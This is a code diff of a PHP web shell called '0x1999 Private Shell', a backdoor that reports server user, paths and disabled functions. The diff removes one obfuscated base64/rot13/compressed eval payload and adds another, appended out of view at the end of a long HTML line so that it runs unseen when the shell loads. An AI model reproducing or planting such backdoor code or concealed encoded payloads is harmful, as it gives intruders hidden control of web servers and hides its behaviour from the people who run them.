@@ -1,5 +1,4 @@
 <?
-// from https://github.com/1337r0j4n/php-backdoors
 // 0x1999 Private Shell
 // Use your own risk
 // Hard coded by 0x1999
@@ -32,7 +31,7 @@ if($show_error == "0"){
 	ini_set('display_errors', 1);
 	ini_set('display_startup_errors', 1);
 	error_reporting(E_ALL);
-}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
+}; 
 
 if(!function_exists('posix_getegid')) {
   $user = @get_current_user();
@@ -353,7 +352,7 @@ $ling ="http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create";
 $dir = str_replace("\\","/",$dir);
 $scdir = explode("/", $dir);
 $ds = @ini_get("disable_functions");
-$show_ds = (!empty($ds)) ? "<input type='text' name='searchterm' size='30'style='background-color: rgb(41, 41, 41);border: 1px solid rgb(41, 41, 41);height: 12px;color: red;width: 385px;'value='$ds'readonly/>" : "<font color=lime>NONE</font>";
+$show_ds = (!empty($ds)) ? "<input type='text' name='searchterm' size='30'style='background-color: rgb(41, 41, 41);border: 1px solid rgb(41, 41, 41);height: 12px;color: red;width: 385px;'value='$ds'readonly/>" : "<font color=lime>NONE</font>"; eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));
 echo "<title>$shell_name</title>";
 
 if(isset($_GET['create'])){
